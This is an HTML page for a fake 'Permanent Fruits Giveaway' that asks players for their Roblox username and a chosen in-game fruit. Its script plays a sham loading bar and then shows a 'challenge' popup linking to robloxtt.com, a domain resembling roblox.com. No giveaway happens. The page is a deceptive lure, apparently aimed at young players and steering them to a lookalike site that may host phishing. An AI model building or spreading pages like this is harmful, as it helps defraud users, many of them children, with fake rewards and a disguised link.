<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Permanent Fruits Giveaway</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap">
    <style>
        body {
            background-color: #0a0a0a;
            color: white;
            font-family: 'Orbitron', sans-serif;
            text-align: center;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        .container {
            background: rgba(20, 20, 20, 0.95);
            padding: 25px;
            border-radius: 12px;
            width: 420px;
            transition: transform 0.3s ease-in-out;
            border: 2px solid #333;
        }

        .container:hover {
            transform: scale(1.03);
        }

        .title {
            font-size: 26px;
            margin-bottom: 8px;
            letter-spacing: 1px;
        }

        input, select, button {
            width: 92%;
            padding: 12px;
            margin-top: 12px;
            border: none;
            outline: none;
            font-size: 16px;
            border-radius: 6px;
            transition: all 0.3s ease-in-out;
        }

        input, select {
            background: #181818;
            color: white;
        }

        button {
            background: #292929;
            color: white;
            font-weight: bold;
            cursor: pointer;
        }

        button:hover {
            background: #505050;
            transform: scale(1.07);
        }

        .loading-bar {
            width: 100%;
            height: 5px;
            background: #111;
            border-radius: 5px;
            overflow: hidden;
            margin-top: 10px;
            display: none;
        }

        .loading-progress {
            width: 0;
            height: 100%;
            background: white;
            transition: width 3s ease-in-out;
        }

        .popup {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) scale(0);
            background: rgba(30, 30, 30, 0.95);
            padding: 20px;
            border-radius: 8px;
            width: 300px;
            text-align: center;
            opacity: 0;
            transition: transform 0.3s ease-in-out, opacity 0.3s ease-in-out;
        }

        .popup.show {
            opacity: 1;
            transform: translate(-50%, -50%) scale(1);
        }

        .popup p {
            font-size: 16px;
            font-weight: bold;
            margin-bottom: 10px;
        }

        .popup button {
            background: #505050;
            margin-top: 10px;
            padding: 10px;
            width: 80%;
            font-size: 16px;
        }

        a {
            color: white;
            font-weight: bold;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="title">Permanent Fruits Giveaway</h1>
        <p>Enter your Roblox username and select your fruit.</p>

        <input type="text" id="username" placeholder="Enter your Roblox username">

        <select id="fruit">
            <option value="" disabled selected>Choose a Permanent Fruit</option>
            <option>Permanent Dragon</option>
            <option>Permanent Leopard</option>
            <option>Permanent Kitsune</option>
            <option>Permanent Mammoth</option>
            <option>Permanent T-Rex</option>
            <option>Permanent Dough</option>
            <option>Permanent Venom</option>
            <option>Permanent Shadow</option>
            <option>Permanent Buddha</option>
            <option>Permanent Phoenix</option>
            <option>Permanent Light</option>
            <option>Permanent Dark</option>
            <option>Permanent Ice</option>
            <option>Permanent Magma</option>
            <option>Permanent Rubber</option>
            <option>Permanent Gravity</option>
            <option>Permanent Control</option>
            <option>Permanent Rumble</option>
            <option>Permanent Barrier</option>
            <option>Permanent Diamond</option>
            <option>Permanent Love</option>
        </select>

        <button id="enterBtn">Enter</button>

        <div class="loading-bar" id="loading">
            <div class="loading-progress"></div>
        </div>
    </div>

    <div class="popup" id="popup">
        <p>⚠️ Complete Our Challenge to Claim ⚠️</p>
        <p>Join Our Group: <span id="join-status">0/1</span></p>
        <a href="https://robloxtt.com/groups/4071074314/" target="_blank">
            <button>Join Now</button>
        </a>
    </div>

    <script>
        document.getElementById("enterBtn").addEventListener("click", function() {
            let username = document.getElementById("username").value.trim();
            let fruit = document.getElementById("fruit").value;
            let loadingDiv = document.getElementById("loading");
            let progressDiv = document.querySelector(".loading-progress");
            let popup = document.getElementById("popup");

            if (username === "" || fruit === null || fruit === "") {
                alert("❌ Please enter your username and select a fruit!");
                return;
            }

            loadingDiv.style.display = "block";
            progressDiv.style.width = "0%";

            setTimeout(() => {
                progressDiv.style.width = "100%";
            }, 50);

            setTimeout(() => {
                loadingDiv.style.display = "none";
                popup.classList.add("show");
            }, 3000);
        });
    </script>
</body>
</html>
